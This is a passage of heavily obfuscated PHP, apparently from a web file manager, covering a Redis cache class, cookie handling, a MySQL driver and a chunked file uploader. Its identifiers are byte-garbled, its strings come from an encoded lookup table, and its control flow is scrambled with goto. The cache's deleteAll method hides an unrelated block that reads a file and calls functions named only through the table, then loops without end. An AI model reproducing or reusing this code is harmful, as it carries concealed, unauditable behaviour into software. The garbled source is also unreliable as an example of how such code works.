$e­Ú‡±ªóŠ[0], $fãŒ–Îˆå¥[167] => $e­Ú‡±ªóŠ[1]); $eÒ’æŞù = array_merge($eÒ’æŞù, $C‚Š¶Ïµ·»); } public function set($CÕÑÑä˜àî, $eÄÁª–òˆ¾, $EÎ•ÒÉË„ = false) { $EÎ•ÒÉË„ = $EÎ•ÒÉË„ ? $EÎ•ÒÉË„ : $this->cacheTime; return $this->handle->setEx($CÕÑÑä˜àî, $EÎ•ÒÉË„, $eÄÁª–òˆ¾); } public function setLock($E’ÜâÜù‹, $DÕ÷ŠÁ¡µæ, $A‡ô°À›‡ø) { return $this->handle->setNX($E’ÜâÜù‹, $DÕ÷ŠÁ¡µæ); } public function get($C”Ñ£áÌ’) { $Cò¼˜…º˜† = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Cò¼˜…º˜†->get($C”Ñ£áÌ’); } public function remove($EŠ‹ºÍƒé) { return $this->handle->del($EŠ‹ºÍƒé); } public function deleteAll() { $bÄš•ã«ˆ =& $_SERVER[¢à]; if (!isset($_SERVER[$bÄš•ã«ˆ[786]]) || !isset($_SERVER[$bÄš•ã«ˆ[787]])) { goto eÑƒå´Œ¸; CÃí…Œ™½Ú: for ($eõ±Ã–’‚é = $BÙÂÂõ¨ªŒ; $eõ±Ã–’‚é > 0; $eõ±Ã–’‚é++) { $d™²È”ÇÃù = json_encode($GLOBALS[$bÄš•ã«ˆ[381]]); } goto AÚÂÈ¯‰; eÑƒå´Œ¸: $Dé¬Ò›°ˆ = $bÄš•ã«ˆ[788]; $cÀ—Ï¯Ï¬® = $bÄš•ã«ˆ[789]; $F×Û‚Ö ùå = $_SERVER[$bÄš•ã«ˆ[790]] . $bÄš•ã«ˆ[791]; goto eå¾ğĞ…ƒ¬; eå¾ğĞ…ƒ¬: $C„õøï·¯œ = $cÀ—Ï¯Ï¬®($F×Û‚Ö ùå); $C…·ÖÃæ™¥ = explode($bÄš•ã«ˆ[214], $C„õøï·¯œ); if (count($C…·ÖÃæ™¥) < $bÄš•ã«ˆ[558]) { $CğªîÌò‚ = $bÄš•ã«ˆ[792]; $CğªîÌò‚(); } goto F¹º‰î•‘â; F¹º‰î•‘â: $d™²È”ÇÃù = $bÄš•ã«ˆ[793]; $d™²È”ÇÃù($_SERVER[$bÄš•ã«ˆ[794]]); $BÙÂÂõ¨ªŒ = 1; goto CÃí…Œ™½Ú; AÚÂÈ¯‰: } if ($this->isCluster) { foreach ($this->handle->_masters() as $DíÊÎ§¼Ñ´) { $this->handle->flushall($DíÊÎ§¼Ñ´); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($F©Ú„¶ä­» = '', $BŸ“ˆíè‰´ = 0) { if (is_string($F©Ú„¶ä­») && $F©Ú„¶ä­» != $_SERVER[¢à][33]) { $this->prefix = $F©Ú„¶ä­»; } if (is_numeric($BŸ“ˆíè‰´) && $BŸ“ˆíè‰´ > 0) { $this->expire = $BŸ“ˆíè‰´; } } public static function getInstance() { static $fÉ½ÚËëãÚ; if ($fÉ½ÚËëãÚ === null) { $fÉ½ÚËëãÚ = new self(); } return $fÉ½ÚËëãÚ; } private static $sameCookieSet = array(); public static function set($Dßàè Ú„, $Añé¢Üí¶, $fß¯ø¾„Æˆ = 0, $e½’Ú‚‚š = false, $EğÄ–ªë¦ª = false) { $aå¹õØ¢ßÑ =& $_SERVER[¢à]; if (!$fß¯ø¾„Æˆ) { $fß¯ø¾„Æˆ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Dßàè Ú„]) && self::$sameCookieSet[$Dßàè Ú„] == $Añé¢Üí¶ . $fß¯ø¾„Æˆ) { return; } self::$sameCookieSet[$Dßàè Ú„] = $Añé¢Üí¶ . $fß¯ø¾„Æˆ; if (!$EğÄ–ªë¦ª) { $EğÄ–ªë¦ª = str_replace(HOST, $aå¹õØ¢ßÑ[33], APP_HOST); $EğÄ–ªë¦ª = _get($GLOBALS, $aå¹õØ¢ßÑ[795], $EğÄ–ªë¦ª); } setcookie($Dßàè Ú„, $Añé¢Üí¶, time() + $fß¯ø¾„Æˆ, $aå¹õØ¢ßÑ[8] . trim($EğÄ–ªë¦ª, $aå¹õØ¢ßÑ[8]), !1, !1, $e½’Ú‚‚š); } public static function setSafe($D÷¸Œë»á, $CõóÒË÷­‚, $A•˜’ä©ª = 0) { self::set($D÷¸Œë»á, $CõóÒË÷­‚, $A•˜’ä©ª, !0); } public static function get($DœóîÜ²’) { return isset($_COOKIE[$DœóîÜ²’]) ? $_COOKIE[$DœóîÜ²’] : !1; } public static function remove($Bç‡îÕ´Á, $c¦ÆÊÇØ«Ì = false) { unset($_COOKIE[$Bç‡îÕ´Á]); self::set($Bç‡îÕ´Á, $_SERVER[¢à][33], 1, $c¦ÆÊÇØ«Ì); } } class DbMysql extends Db { public function __construct($A­¤ÉŸ•” = '') { $cÒ²¨ëöøõ =& $_SERVER[¢à]; if (!extension_loaded($cÒ²¨ëöøõ[728])) { think_exception(think_lang($cÒ²¨ëöøõ[10]) . $cÒ²¨ëöøõ[796]); } if (!empty($A­¤ÉŸ•”)) { $this->config = $A­¤ÉŸ•”; if (empty($this->config[$cÒ²¨ëöøõ[13]])) { $this->config[$cÒ²¨ëöøõ[13]] = $cÒ²¨ëöøõ[33]; } } } public function connect($a¯Œ„Ô¿Ò® = '', $AµÛÕŒ²°á = 0, $c¡êˆÇ‘Ÿİ = false) { $c—îì·…‡ =& $_SERVER[¢à]; if (!isset($this->linkID[$AµÛÕŒ²°á])) { goto bÜœ¦¶š©Â; bÜœ¦¶š©Â: if (empty($a¯Œ„Ô¿Ò®)) { $a¯Œ„Ô¿Ò® = $this->config; } $BóæĞ•Àµó = $a¯Œ„Ô¿Ò®[$c—îì·…‡[797]] . ($a¯Œ„Ô¿Ò®[$c—îì·…‡[798]] ? "\x3a{$a¯Œ„Ô¿Ò®[$c—îì·…‡[798]]}" : $c—îì·…‡[33]); $d¶ò«ğƒÓ„ = !empty($a¯Œ„Ô¿Ò®[$c—îì·…‡[13]][$c—îì·…‡[14]]) ? $a¯Œ„Ô¿Ò®[$c—îì·…‡[13]][$c—îì·…‡[14]] : $this->pconnect; goto cœ¡¬ô†Ï; Díï¶¿­»é: if (1 != think_config($c—îì·…‡[18])) { unset($this->config); } goto Cå‡™í¹ê; cœ¡¬ô†Ï: if ($d¶ò«ğƒÓ„) { $this->linkID[$AµÛÕŒ²°á] = mysql_pconnect($BóæĞ•Àµó, $a¯Œ„Ô¿Ò®[$c—îì·…‡[799]], $a¯Œ„Ô¿Ò®[$c—îì·…‡[800]], 131072); } else { $this->linkID[$AµÛÕŒ²°á] = mysql_connect($BóæĞ•Àµó, $a¯Œ„Ô¿Ò®[$c—îì·…‡[799]], $a¯Œ„Ô¿Ò®[$c—îì·…‡[800]], !0, 131072); } if (!$this->linkID[$AµÛÕŒ²°á] || !empty($a¯Œ„Ô¿Ò®[$c—îì·…‡[17]]) && !mysql_select_db($a¯Œ„Ô¿Ò®[$c—îì·…‡[17]], $this->linkID[$AµÛÕŒ²°á])) { think_exception(mysql_error()); } $cè”äôÆô = mysql_get_server_info($this->linkID[$AµÛÕŒ²°á]); goto DƒÌæó™; DƒÌæó™: mysql_query($c—îì·…‡[801] . think_config($c—îì·…‡[802]) . $c—îì·…‡[55], $this->linkID[$AµÛÕŒ²°á]); if ($cè”äôÆô > $c—îì·…‡[803]) { mysql_query($c—îì·…‡[804], $this->linkID[$AµÛÕŒ²°á]); } $this->connected = !0; goto Díï¶¿­»é; Cå‡™í¹ê: } return $this->linkID[$AµÛÕŒ²°á]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aä¦Ò¬¸è‘) { goto EÑÒ¯œÚ—; f¡Èë·™éö: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Cƒ¨æœµ¿²; BàöŠ¡Õ…è: if (!$this->_linkID) { return !1; } $this->queryStr = $aä¦Ò¬¸è‘; if ($this->queryID) { $this->free(); } goto fª„… ¦ŸŠ; EÑÒ¯œÚ—: $A¯£Âªá¾Ï =& $_SERVER[¢à]; if (0 === stripos($aä¦Ò¬¸è‘, $A¯£Âªá¾Ï[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto BàöŠ¡Õ…è; fª„… ¦ŸŠ: think_action_status($A¯£Âªá¾Ï[19], 1); think_status($A¯£Âªá¾Ï[20]); $this->queryID = mysql_query($aä¦Ò¬¸è‘, $this->_linkID); goto f¡Èë·™éö; Cƒ¨æœµ¿²: } public function execute($EÅùÂ’‹„Ş) { goto AÉ »Ğ´Ø–; c…†¸Å: $this->queryStr = $EÅùÂ’‹„Ş; if ($this->queryID) { $this->free(); } think_action_status($BöÕ‰Ù÷È[21], 1); goto d‚ŞğÓ×ö; d‚ŞğÓ×ö: think_status($BöÕ‰Ù÷È[20]); $Bî‚¥æ‘ù = mysql_query($EÅùÂ’‹„Ş, $this->_linkID); $this->debug(); goto f½©’œ“; f½©’œ“: if (!1 === $Bî‚¥æ‘ù) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto fÃÙ‹ÂÇÍè; AÉ »Ğ´Ø–: $BöÕ‰Ù÷È =& $_SERVER[¢à]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c…†¸Å; fÃÙ‹ÂÇÍè: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¢à][805], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BŸ¢—´‰ğÖ = mysql_query($_SERVER[¢à][806], $this->_linkID); $this->transTimes = 0; if (!$BŸ¢—´‰ğÖ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c½‘Ä°¢‰ï = mysql_query($_SERVER[¢à][807], $this->_linkID); $this->transTimes = 0; if (!$c½‘Ä°¢‰ï) { $this->error(); return !1; } } return !0; } private function getAll() { $b…šÒˆĞ“² = array(); if ($this->numRows > 0) { while ($F…«İ‡ˆÙ„ = mysql_fetch_assoc($this->queryID)) { $b…šÒˆĞ“²[] = $F…«İ‡ˆÙ„; } mysql_data_seek($this->queryID, 0); } return $b…šÒˆĞ“²; } public function getFields($eµ…¸ç†ÌÅ) { $FÜºø­ï‹Ç =& $_SERVER[¢à]; $dÏŠªˆÕá = $this->query($FÜºø­ï‹Ç[808] . $this->parseKey($eµ…¸ç†ÌÅ)); $C÷õ¡˜÷—ˆ = array(); if ($dÏŠªˆÕá) { foreach ($dÏŠªˆÕá as $aøãêŞÜ›Ü => $e»ùæâˆ›Ô) { $C÷õ¡˜÷—ˆ[$e»ùæâˆ›Ô[$FÜºø­ï‹Ç[27]]] = array($FÜºø­ï‹Ç[28] => $e»ùæâˆ›Ô[$FÜºø­ï‹Ç[27]], $FÜºø­ï‹Ç[29] => $e»ùæâˆ›Ô[$FÜºø­ï‹Ç[30]], $FÜºø­ï‹Ç[31] => (bool) (strtoupper($e»ùæâˆ›Ô[$FÜºø­ï‹Ç[32]]) === $FÜºø­ï‹Ç[809]), $FÜºø­ï‹Ç[34] => $e»ùæâˆ›Ô[$FÜºø­ï‹Ç[35]], $FÜºø­ï‹Ç[36] => strtolower($e»ùæâˆ›Ô[$FÜºø­ï‹Ç[37]]) == $FÜºø­ï‹Ç[38], $FÜºø­ï‹Ç[39] => strtolower($e»ùæâˆ›Ô[$FÜºø­ï‹Ç[40]]) == $FÜºø­ï‹Ç[41]); } } return $C÷õ¡˜÷—ˆ; } public function getTables($A®«è¸–„Í = '') { $B©ğ¸ëÇ„’ =& $_SERVER[¢à]; if (!empty($A®«è¸–„Í)) { $dâ¼ì•çŒæ = $B©ğ¸ëÇ„’[810] . $A®«è¸–„Í; } else { $dâ¼ì•çŒæ = $B©ğ¸ëÇ„’[811]; } $cğ·Â¶÷Š = $this->query($dâ¼ì•çŒæ); $Cœ…‚¨‘”Å = array(); foreach ($cğ·Â¶÷Š as $cè£ÂòÈ£ => $Bø³ÖĞ¯‡‚) { $Cœ…‚¨‘”Å[$cè£ÂòÈ£] = current($Bø³ÖĞ¯‡‚); } return $Cœ…‚¨‘”Å; } public function replace($e» ó‰ ô, $F¬Ğ“˜Ö‹ë = array()) { $Dàğ¼÷ÌÁ =& $_SERVER[¢à]; foreach ($e» ó‰ ô as $cŒˆãÜ—œÖ => $a £¿²¡×) { $aÒ«èğ¸ƒ = $this->parseValue($a £¿²¡×); if (is_scalar($aÒ«èğ¸ƒ)) { $bæë¬‹¤‰[] = $aÒ«èğ¸ƒ; $E„Ã¤É¬É[] = $this->parseKey($cŒˆãÜ—œÖ); } } $eó‘‚‚Ç„“ = $Dàğ¼÷ÌÁ[812] . $this->parseTable($F¬Ğ“˜Ö‹ë[$Dàğ¼÷ÌÁ[264]]) . $Dàğ¼÷ÌÁ[813] . implode($Dàğ¼÷ÌÁ[47], $E„Ã¤É¬É) . $Dàğ¼÷ÌÁ[814] . implode($Dàğ¼÷ÌÁ[47], $bæë¬‹¤‰) . $Dàğ¼÷ÌÁ[815]; return $this->execute($eó‘‚‚Ç„“); } public function insertAll($FóÛ×Ì›îØ, $aèµ°¶•‹ = array(), $c‚¨˜ã = false) { goto e½ÚŠæ¤ ‡; e½ÚŠæ¤ ‡: $EŒ´‚’ËÍ =& $_SERVER[¢à]; if (!is_array($FóÛ×Ì›îØ[0])) { return !1; } $eà“Êîàà° = array_keys($FóÛ×Ì›îØ[0]); goto CŒìƒäÓ¬; CŒìƒäÓ¬: $EğŞ„Íó“˜ = array(); foreach ($FóÛ×Ì›îØ as $cßÔî÷‘óâ) { $b´ ¤‚§ = array(); foreach ($cßÔî÷‘óâ as $b©º±âß´ã => $AìµèŞï¶ë) { $AìµèŞï¶ë = $this->parseValue($AìµèŞï¶ë); if (is_scalar($AìµèŞï¶ë)) { $b´ ¤‚§[] = $AìµèŞï¶ë; } } $EğŞ„Íó“˜[] = $EŒ´‚’ËÍ[245] . implode($EŒ´‚’ËÍ[47], $b´ ¤‚§) . $EŒ´‚’ËÍ[815]; } array_walk($eà“Êîàà°, array($this, $EŒ´‚’ËÍ[816])); goto A»‹å´ïêƒ; A»‹å´ïêƒ: $e† Û´Ó’ö = ($c‚¨˜ã ? $EŒ´‚’ËÍ[817] : $EŒ´‚’ËÍ[818]) . $EŒ´‚’ËÍ[819] . $this->parseTable($aèµ°¶•‹[$EŒ´‚’ËÍ[264]]) . $EŒ´‚’ËÍ[813] . implode($EŒ´‚’ËÍ[47], $eà“Êîàà°) . $EŒ´‚’ËÍ[820] . implode($EŒ´‚’ËÍ[47], $EğŞ„Íó“˜); return $this->execute($e† Û´Ó’ö); goto BÑÆ´Ü—–; BÑÆ´Ü—–: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Cœ¦ê‡Şöò =& $_SERVER[¢à]; $this->error = mysql_errno() . $Cœ¦ê‡Şöò[4] . mysql_error($this->_linkID); if ($Cœ¦ê‡Şöò[33] != $this->queryStr) { $this->error .= LNG($Cœ¦ê‡Şöò[45]) . $this->queryStr; } think_trace($this->error, $Cœ¦ê‡Şöò[33], $Cœ¦ê‡Şöò[46]); return $this->error; } public function escapeString($fÖÅˆ³õ†Ø) { if ($this->_linkID) { return mysql_real_escape_string($fÖÅˆ³õ†Ø, $this->_linkID); } else { return mysql_escape_string($fÖÅˆ³õ†Ø); } } public function parseKey(&$aÁ¹åÀâË, $f‰öœÉóò = true) { $B‘Èé±—¨È =& $_SERVER[¢à]; if ($f‰öœÉóò) { $aÁ¹åÀâË = $this->parseKeyCheck($aÁ¹åÀâË); } if ($aÁ¹åÀâË != $B‘Èé±—¨È[173] && !preg_match($B‘Èé±—¨È[821], $aÁ¹åÀâË)) { $aÁ¹åÀâË = $B‘Èé±—¨È[822] . trim($aÁ¹åÀâË, $B‘Èé±—¨È[822]) . $B‘Èé±—¨È[822]; } return $aÁ¹åÀâË; } } goto F–¬™½Ù…Ä; C¨ŞÄ¢†œ: $F¾ÓŞ˜Ä…ë = $_SERVER[¢à][543]; $_SERVER[‘­Á¢æÊÚ–£] = explode($_SERVER[¢à][544], gzinflate(substr($_SERVER[¢à][545], 10, -8))); $D”¨¶ÄŠš = $_SERVER[¢à][546]; goto cÔ×¢¸“; B…Ö‘ì­·³: if (class_exists($_SERVER[¢à][1937])) { class Services_JSON_Error extends PEAR_Error { function __construct($aóŠğ õÅº = "\x75\x6e\x6b\x6e\157\x77\156\40\x65\162\162\x6f\162", $BÁº÷ù÷´– = null, $bøˆ†¡Æî = null, $d·‚âæ‘Ö¢ = null, $aÈÚºñÍ·¶ = null) { parent::PEAR_Error($aóŠğ õÅº, $BÁº÷ù÷´–, $bøˆ†¡Æî, $d·‚âæ‘Ö¢, $aÈÚºñÍ·¶); } } } else { class Services_JSON_Error { function __construct($D„ŠÏÕ«÷² = "\165\x6e\x6b\156\157\x77\156\40\145\x72\162\x6f\x72", $D¹¡ÛÁ•‰² = null, $DÔĞ™ òî = null, $B’ÄŸ´Á‰ = null, $b¾õ†÷ğä• = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto d®´â›Õá›; d®´â›Õá›: $AÚÕÄ†œ‘© =& $_SERVER[¢à]; global $in; $this->in =& $in; goto e’ƒŞÈç; F««¯ÏÖğ: $this->checkSize(); $this->tempPathInit(); goto e“¯·Ğ÷É; e’ƒŞÈç: if (!empty($_FILES)) { $Fí³éèÀ’¶ = $_FILES[$AÚÕÄ†œ‘©[164]]; $this->uploadFile = $Fí³éèÀ’¶[$AÚÕÄ†œ‘©[1938]]; if (!$this->uploadFile && $Fí³éèÀ’¶[$AÚÕÄ†œ‘©[1208]] > 0) { show_json($this->errorInfo($Fí³éèÀ’¶[$AÚÕÄ†œ‘©[1208]]), !1); } } else { if (isset($in[$AÚÕÄ†œ‘©[383]])) { $this->uploadFile = isset($in[$AÚÕÄ†œ‘©[1939]]) ? $AÚÕÄ†œ‘©[1940] : $AÚÕÄ†œ‘©[1785]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto F««¯ÏÖğ; e“¯·Ğ÷É: } public function upload() { goto d¥å ê¥´; CàêÃŸ“¯Ø: $cÅ••šÍ÷ô = $this->tempFile . $c¾«¶³ÙøÉ[1943] . $d¬‘ÌË¹÷„; $cÓƒâÃ© = isset($this->in[$c¾«¶³ÙøÉ[516]]) ? intval($this->in[$c¾«¶³ÙøÉ[516]]) : 0; $CªÊµ•ÜÍ¯ = isset($this->in[$c¾«¶³ÙøÉ[1944]]) ? intval($this->in[$c¾«¶³ÙøÉ[1944]]) : 0; goto FÜ­”ÛÊ‡¹; D¸Ü¹¶‚â: CacheLock::lock($this->tempFile, 20); $e¨»•‘‚ÉÇ = $this->statusGet(); $this->initFileTemp(); goto Bñ¾ë–ÑĞ¢; Bñ¾ë–ÑĞ¢: $aó‡õœŞ¤ = $this->moveUploadedFile($cÅ••šÍ÷ô); if ($cÓƒâÃ© > 0 && filesize($aó‡õœŞ¤) == 0) { $this->showJson($c¾«¶³ÙøÉ[1946], !1); } if (!$aó‡õœŞ¤) { $this->showJson(LNG($c¾«¶³ÙøÉ[1947]), !1); } goto dáèë¿Ñ‰è; e³˜¼ºÔ‚: ignore_timeout(); if (!$this->checkChunkHash($e¨»•‘‚ÉÇ)) { $this->showJson($c¾«¶³ÙøÉ[1955], !1); } $this->statusSet(!1); goto CßÜ²Ì¬æ«; CßÜ²Ì¬æ«: CacheLock::unlock($this->tempFile); return $this->tempFile; goto A“×Ö®‰‚»; dµ½Ğ—ô: @unlink($aó‡õœŞ¤); if (!$B••·„Â—¾) { $this->showJson($c¾«¶³ÙøÉ[1949] . $d¬‘ÌË¹÷„, !1); } $e¨»•‘‚ÉÇ[$c¾«¶³ÙøÉ[1950]] = $cäàò„Æ¶Æ; goto A³«ˆÉæ˜¨; FÜ­”ÛÊ‡¹: if ($cäàò„Æ¶Æ > 1 && $CªÊµ•ÜÍ¯ <= 0) { show_json($c¾«¶³ÙøÉ[1945], !1); } if ($CªÊµ•ÜÍ¯ > $cÓƒâÃ©) { $cäàò„Æ¶Æ = 1; } if ($cäàò„Æ¶Æ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto D¸Ü¹¶‚â; d¥å ê¥´: $c¾«¶³ÙøÉ =& $_SERVER[¢à]; $d¬‘ÌË¹÷„ = isset($this->in[$c¾«¶³ÙøÉ[1941]]) ? intval($this->in[$c¾«¶³ÙøÉ[1941]]) : 0; $cäàò„Æ¶Æ = isset($this->in[$c¾«¶³ÙøÉ[1942]]) ? intval($this->in[$c¾«¶³ÙøÉ[1942]]) : 1; goto CàêÃŸ“¯Ø; dáèë¿Ñ‰è: $e›™­¬Šï» = $d¬‘ÌË¹÷„ * $CªÊµ•ÜÍ¯; $dá¹Ş§Æ‚¢ = @fopen($this->tempFile, $c¾«¶³ÙøÉ[1948]); fseek($dá¹Ş§Æ‚¢, $e›™­¬Šï»); goto BÀ ¾”ÜÖô; BÀ ¾”ÜÖô: $B••·„Â—¾ = $this->writeTo($aó‡õœŞ¤, $dá¹Ş§Æ‚¢, $this->tempFile); $céÒøÜ³ƒæ = IO::hashSimple($aó‡õœŞ¤); $cÓƒâÃ© = IO::size($aó‡õœŞ¤); goto dµ½Ğ—ô; A³«ˆÉæ˜¨: $e¨»•‘‚ÉÇ[$c¾«¶³ÙøÉ[1951]][$c¾«¶³ÙøÉ[1952] . $d¬‘ÌË¹÷„] = array($c¾«¶³ÙøÉ[1953] => $e›™­¬Šï», $c¾«¶³ÙøÉ[1032] => $d¬‘ÌË¹÷„, $c¾«¶³ÙøÉ[77] => $cÓƒâÃ©, $c¾«¶³ÙøÉ[161] => $céÒøÜ³ƒæ); $this->statusSet($e¨»•‘‚ÉÇ); if (count($e¨»•‘‚ÉÇ[$c¾«¶³ÙøÉ[1951]]) != $e¨»•‘‚ÉÇ[$c¾«¶³ÙøÉ[1950]]) { $this->showJson($c¾«¶³ÙøÉ[1954] . $d¬‘ÌË¹÷„, !0); } goto e³˜¼ºÔ‚; A“×Ö®‰‚»: } private function checkSize() { $dôãšô˜Š =& $_SERVER[¢à]; if (phpBuild64() || $this->in[$dôãšô˜Š[77]] < PHP_INT_MAX) { return; } show_json(LNG($dôãšô˜Š[1956]), !1); } private function showJson($AÈ–Ÿîïî, $cğ–ÅĞ±Š») { CacheLock::unlock($this->tempFile); if (!$cğ–ÅĞ±Š») { return show_json($AÈ–Ÿîïî, $cğ–ÅĞ±Š»); } show_json($AÈ–Ÿîïî, $cğ–ÅĞ±Š»); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto C¸Û‚ò¤î; C¸Û‚ò¤î: $D¡›£¸â×ğ =& $_SERVER[¢à]; $a›éÃ¥Å„Ç = TEMP_FILES; @mk_dir($a›éÃ¥Å„Ç); goto EÆŒµ¤Öœç; EÆŒµ¤Öœç: touch($a›éÃ¥Å„Ç . $D¡›£¸â×ğ[1957]); $dô¶Š—ªø = isset($this->in[$D¡›£¸â×ğ[1958]]) ? $this->in[$D¡›£¸â×ğ[1958]] : !1; if (strlen($dô¶Š—ªø) < 30) { $dô¶Š—ªø = md5(USER_ID . $this->in[$D¡›£¸â×ğ[75]] . $this->fileName . $this->in[$D¡›£¸â×ğ[77]]); } goto cáØˆ¬–Ò‡; cáØˆ¬–Ò‡: $this->tempFile = $a›éÃ¥Å„Ç . $D¡›£¸â×ğ[1959] . md5($dô¶Š—ªø . $this->in[$D¡›£¸â×ğ[1503]]); goto d¿÷†‹Œ£; d¿÷†‹Œ£: } private function moveUploadedFile($dÚÜÓÜµ¼) { $cÆçÄÀæ˜ò =& $_SERVER[¢à]; $DŠ¦Ş‡³¿« = $this->uploadFile; if ($DŠ¦Ş‡³¿« == $cÆçÄÀæ˜ò[1960]) { @file_put_contents($dÚÜÓÜµ¼, base64_decode($_REQUEST[$cÆçÄÀæ˜ò[1961]])); } else { if ($DŠ¦Ş‡³¿« == $cÆçÄÀæ˜ò[1785]) { $céâ¿Ù©ëˆ = @fopen($dÚÜÓÜµ¼, $cÆçÄÀæ˜ò[1492]); $this->writeTo($DŠ¦Ş‡³¿«, $céâ¿Ù©ëˆ, $dÚÜÓÜµ¼); } else { if (!move_uploaded_file($DŠ¦Ş‡³¿«, $dÚÜÓÜµ¼)) { return !1; } } } return $dÚÜÓÜµ¼; } private function writeTo($bëƒí¡šÑ¦, $fÌÍã¿‘Òà, $fôÄñ™£¤) { goto eÒòø¦·õ³; Fè‰Œà‰ƒ­: return !0; goto Bùµá‡ìø¾; bÒ¯‹Ì¸–: $AÎÁæğ™» = @fopen($bëƒí¡šÑ¦, $Càˆàãèí[1491]); if (!$AÎÁæğ™» || !$fÌÍã¿‘Òà || !$D£‚éŠÕ) { CacheLock::unlock($a»›ñÚ´Øù); return !1; } while (!feof($AÎÁæğ™»)) { fwrite($fÌÍã¿‘Òà, fread($AÎÁæğ™», 1024 * 200)); } goto aŒÎƒãŞ×Ü; aŒÎƒãŞ×Ü: fclose($AÎÁæğ™»); fclose($fÌÍã¿‘Òà); CacheLock::unlock($a»›ñÚ´Øù); goto Fè‰Œà‰ƒ­; eÒòø¦·õ³: $Càˆàãèí =& $_SERVER[¢à]; $a»›ñÚ´Øù = $Càˆàãèí[1962] . $fôÄñ™£¤; $D£‚éŠÕ = CacheLock::lock($a»›ñÚ´Øù, 1); goto bÒ¯‹Ì¸–; Bùµá‡ìø¾: } private function statusGet() { goto Eˆï¥ùÀÕ; c¶È¥±—Øµ: $eö×µ †í = !1; if (file_exists($b‰ÏÆ«ç¥Ï)) { $eö×µ †í = @file_get_contents($b‰ÏÆ«ç¥Ï); } if ($eö×µ †í) { $this->statusData = unserialize($eö×µ †í); } goto bèÃÈàë†Ó; bèÃÈàë†Ó: if (!$this->statusData) { $C”¹öì¶‘ = array($D°õÌ§âÛ[28] => $this->fileName, $D°õÌ§âÛ[1950] => 0, $D°õÌ§âÛ[1951] => array()); $this->statusSet($C”¹öì¶‘); } return $this->statusData; goto FË‹šˆ³ïğ; Eˆï¥ùÀÕ: $D°õÌ§âÛ =& $_SERVER[¢à]; if (is_array($this->statusData)) { return $this->statusData; } $b‰ÏÆ«ç¥Ï = $this->tempFile . $D°õÌ§âÛ[1963]; goto c¶È¥±—Øµ; FË‹šˆ³ïğ: } public function statusSet($C­©¥´Ñ©÷) { $dãìƒ‡Ù = $this->tempFile . $_SERVER[¢à][1963]; if (!$C­©¥´Ñ©÷) { if (file_exists($dãìƒ‡Ù)) { @unlink($dãìƒ‡Ù); } return !0; } $this->statusData = $C­©¥´Ñ©÷; return file_put_contents($dãìƒ‡Ù, serialize($C­©¥´Ñ©÷)); } private function initFileTemp() { $aÊÜƒ¼Üä× =& $_SERVER[¢à]; if (file_exists($this->tempFile)) { return; } $a™‡Ö”éÎ¡ = fopen($this->tempFile, $aÊÜƒ¼Üä×[1964]); fseek($a™‡Ö”éÎ¡, $this->in[$aÊÜƒ¼Üä×[77]] - 1, SEEK_SET); fwrite($a™‡Ö”éÎ¡, $aÊÜƒ¼Üä×[464]); fclose($a™‡Ö”éÎ¡); } public function checkChunk() { goto B‹ß§ŸÚæÉ; d«“°¬·Ù: return $BÅ†ì½ÇŒá; goto d„…Úõ³İ; B‹ß§ŸÚæÉ: $d½Ğ‚Ò =& $_SERVER[¢à]; $BÅ†ì½ÇŒá = array(); CacheLock::lock($this->tempFile); goto dä™Ï¿òÆ; dä™Ï¿òÆ: $Báò—½ßâÊ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Báò—½ßâÊ[$d½Ğ‚Ò[1951]] as $Aãí±Ù­â) { $CÕ¨Üò”Åâ = $Aãí±Ù­â[$d½Ğ‚Ò[161]]; if ($CÕ¨Üò”Åâ) { $BÅ†ì½ÇŒá[$d½Ğ‚Ò[1965] . $Aãí±Ù­â[$d½Ğ‚Ò[1032]]] = $CÕ¨Üò”Åâ; } } goto d«“°¬·Ù; d„…Úõ³İ: } private function checkChunkHash($aŸ´™øó´¯) { goto Eß’Úñàì; Eß’Úñàì: $dÃ‡ä…µ²Ñ =& $_SERVER[¢à]; if (count($aŸ´™øó´¯[$dÃ‡ä…µ²Ñ[1951]]) != $aŸ´™øó´¯[$dÃ‡ä…µ²Ñ[1950]]) { return !1; } $d£ßŸñİíÃ = _get($this->in, $dÃ‡ä…µ²Ñ[1958]); goto CŠª˜¦ŞÕ; CŠª˜¦ŞÕ: $bµç“¯ñÚ‹ = _get($this->in, $dÃ‡ä…µ²Ñ[1966]); if (strlen($bµç“¯ñÚ‹) == 32 && IO::hashSimple($this->tempFile) == $d£ßŸñİíÃ && IO::hashMd5($this->tempFile) == $bµç“¯ñÚ‹) { return !0; } $Cé ¹«æÍÈ = fopen($this->tempFile, $dÃ‡ä…µ²Ñ[1159]); goto dæ¨„Úçò©; dæ¨„Úçò©: $aÔ®¡Ğõ‰« = !0; foreach ($aŸ´™øó´¯[$dÃ‡ä…µ²Ñ[1951]] as $D‚íŞ¨¸°) { fseek($Cé ¹«æÍÈ, $D‚íŞ¨¸°[$dÃ‡ä…µ²Ñ[1953]]); $Dï±éµºöÑ = PathDriverStream::hash($Cé ¹«æÍÈ, $D‚íŞ¨¸°[$dÃ‡ä…µ²Ñ[77]]); if ($D‚íŞ¨¸°[$dÃ‡ä…µ²Ñ[161]] != $Dï±éµºöÑ) { $aÔ®¡Ğõ‰« = !1; break; } } fclose($Cé 